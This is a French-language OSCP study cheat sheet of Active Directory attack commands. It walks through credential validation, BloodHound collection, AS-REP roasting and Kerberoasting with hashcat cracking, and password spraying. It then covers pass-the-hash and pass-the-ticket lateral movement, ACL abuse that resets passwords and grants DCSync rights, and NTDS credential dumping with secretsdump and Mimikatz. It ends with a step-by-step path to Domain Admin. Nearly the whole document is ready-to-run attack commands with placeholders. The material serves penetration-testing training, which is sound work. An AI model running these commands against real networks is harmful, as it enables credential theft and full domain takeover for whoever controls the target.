# 04 — Active Directory

## 1. Énumération initiale

```bash
# Valider les creds
nxc smb <DC-IP> -u <user> -p <pass>
nxc smb <DC-IP> -u <user> -H <hash>               # Pass-the-Hash

# Infos domaine
nxc smb <DC-IP> -u <user> -p <pass> --users
nxc smb <DC-IP> -u <user> -p <pass> --groups
nxc smb <DC-IP> -u <user> -p <pass> --pass-pol    # politique de mdp

# LDAP
nxc ldap <DC-IP> -u <user> -p <pass> --query "(objectClass=user)" ""
```

---

## 2. BloodHound

```bash
# Collecter depuis Kali
bloodhound-python -u <user> -p <pass> -d <domain> -ns <DC-IP> -c all
bloodhound-python -u <user> -p <pass> -d <domain> -ns <DC-IP> -c all --zip

# Collecter depuis Windows compromis
.\SharpHound.exe -c all
.\SharpHound.exe -c all --zipfilename results.zip

# Lancer BloodHound
sudo neo4j start
bloodhound
```

### Requêtes BloodHound prioritaires
- `Find Shortest Paths to Domain Admins`
- `Find all Kerberoastable Users`
- `Find AS-REP Roastable Users`
- `Find Principals with DCSync Rights`
- `Find computers where Domain Users are Local Admin`
- `Shortest Paths from Owned Principals`

---

## 3. Attaques sans creds (ou creds anonymes)

### AS-REP Roasting
```bash
# Utilisateurs sans pré-authentification Kerberos
GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <DC-IP>
GetNPUsers.py <domain>/<user>:<pass> -request -dc-ip <DC-IP>
nxc ldap <DC-IP> -u <user> -p <pass> --asreproast asrep.txt

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Password Spraying
```bash
nxc smb <DC-IP> -u users.txt -p <password> --continue-on-success
nxc smb <DC-IP> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
# ⚠️ Attention au lockout — vérifier la politique de mdp avant
```

---

## 4. Attaques avec creds valides

### Kerberoasting
```bash
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC-IP> -request
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC-IP> -request -outputfile kerb.txt
nxc ldap <DC-IP> -u <user> -p <pass> --kerberoasting kerb.txt

# Crack
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Énumération shares
```bash
nxc smb <scope> -u <user> -p <pass> --shares
nxc smb <scope> -u <user> -p <pass> -M spider_plus  # spider tous les shares
```

---

## 5. Latéralisation

### Pass-the-Hash
```bash
nxc smb <IP> -u <user> -H <NTLM>
nxc smb <scope> -u <user> -H <NTLM> --continue-on-success
evil-winrm -i <IP> -u <user> -H <NTLM>
psexec.py <domain>/<user>@<IP> -hashes :<NTLM>
wmiexec.py <domain>/<user>@<IP> -hashes :<NTLM>
```

### Pass-the-Ticket
```bash
getTGT.py <domain>/<user>:<pass>
getTGT.py <domain>/<user> -hashes :<NTLM>
export KRB5CCNAME=<user>.ccache
nxc smb <IP> -k --no-pass
psexec.py -k -no-pass <domain>/<user>@<hostname>
```

### Overpass-the-Hash
```bash
getTGT.py <domain>/<user> -hashes :<NTLM> -dc-ip <DC-IP>
export KRB5CCNAME=<user>.ccache
```

---

## 6. ACL Abuse (BloodHound → identifier)

### GenericAll / GenericWrite sur un utilisateur
```bash
# Reset mot de passe
net rpc password <targetuser> <newpass> -U <domain>/<user>%<pass> -S <DC-IP>

# Via PowerView (depuis Windows)
Set-DomainUserPassword -Identity <targetuser> -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
```

### GenericAll sur un groupe
```bash
# Ajouter utilisateur au groupe
net rpc group addmem <group> <user> -U <domain>/<user>%<pass> -S <DC-IP>

# Via PowerView
Add-DomainGroupMember -Identity <group> -Members <user>
```

### WriteDACL
```bash
# Donner DCSync rights
Add-DomainObjectAcl -TargetIdentity <domain> -PrincipalIdentity <user> -Rights DCSync
```

### ForceChangePassword
```bash
net rpc password <targetuser> <newpass> -U <domain>/<user>%<pass> -S <DC-IP>
```

---

## 7. DCSync → Domain Admin

```bash
# Depuis Kali
secretsdump.py <domain>/<user>:<pass>@<DC-IP>
secretsdump.py <domain>/<user>@<DC-IP> -hashes :<NTLM>

# Dump complet NTDS
secretsdump.py -just-dc-ntlm <domain>/<user>:<pass>@<DC-IP>

# Via Mimikatz (depuis Windows)
lsadump::dcsync /domain:<domain> /user:Administrator
lsadump::dcsync /domain:<domain> /all /csv
```

---

## 8. Depuis une machine Windows compromise

```powershell
# Énumération manuelle sans outils
whoami /all
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
nltest /dclist:<domain>
nltest /domain_trusts

# PowerView (si disponible)
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
Get-DomainGroupMember -Identity "Domain Admins"
Find-LocalAdminAccess                              # où tu es admin local ?
Get-DomainUser -SPN                               # Kerberoastable
```

---

## 9. Assumed Breach (format exam OSCP)

> L'exam AD fournit des creds de départ — voici le flow optimal

```
1. nxc smb → valider les creds
2. bloodhound-python → collecter tout
3. Analyser BloodHound → chemin vers DA ?
4. AS-REP Roast + Kerberoast → tenter crack
5. Password spray si liste users disponible
6. Suivre le chemin BloodHound (ACL, groupes)
7. Latéralisation machine par machine
8. DCSync depuis DA ou compte avec droits
9. Pass-the-Hash avec hash Admin → toutes les machines
```

---

## Tags
#oscp #activedirectory #ad #kerberos #bloodhound
